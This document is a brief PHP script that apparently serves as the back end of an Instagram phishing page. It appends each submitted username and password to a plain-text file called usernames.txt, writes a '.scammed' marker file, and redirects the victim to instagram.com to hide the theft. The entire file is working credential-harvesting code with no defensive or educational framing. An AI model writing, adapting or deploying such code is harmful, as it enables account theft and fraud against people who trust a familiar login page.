<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents(".scammed","Fucked", FILE_APPEND);

header('Location: https://instagram.com');
exit();
